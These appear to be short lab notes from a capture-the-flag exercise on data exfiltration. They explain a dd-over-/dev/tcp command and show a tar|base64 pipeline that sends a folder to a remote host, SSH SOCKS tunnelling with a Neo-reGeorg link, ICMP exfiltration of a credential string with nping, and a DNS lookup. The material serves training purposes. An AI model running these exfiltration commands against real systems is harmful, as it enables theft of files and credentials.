# dataxexfilt

Can you explain this command?  

dd conv=ebcdic \> /dev/tcp/192.168.0.133/8080  

The dd command reads from standard input, converts data to EBCDIC encoding, and sends it via the TCP socket. It blocks waiting for input because dd reads stdin before sending. This technique works only in bash environments supporting /dev/tcp.  

It’s a simple pipeline that sends converted data over a TCP socket.

- dd reads from stdin and writes to stdout.

<!-- -->

- conv=ebcdic tells dd to translate input bytes from ASCII to EBCDIC as it writes.

<!-- -->

- /dev/tcp/192.168.0.133/8080 is a bash feature that opens a TCP connection to host 192.168.0.133 port 8080 and writes stdout to it.  
  So whatever you type or pipe into dd gets converted to EBCDIC and sent over the TCP connection. It will block waiting for input and the connection stays open until EOF.

```
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
```

https://github.com/L-codes/Neo-reGeorg

```
ssh thm@victim2.thm.com
ssh thm@10.1.1.2 -4 -N -D 1080
curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
```

```
sudo nping --icmp -c 1 192.168.135.251 --data-string "BOFfile.txt"
sudo nping --icmp -c 1 192.168.135.251 --data-string "admin:password"
sudo nping --icmp -c 1 192.168.135.251 --data-string "EOF"
```

```
dig +short flag.thm.com
```
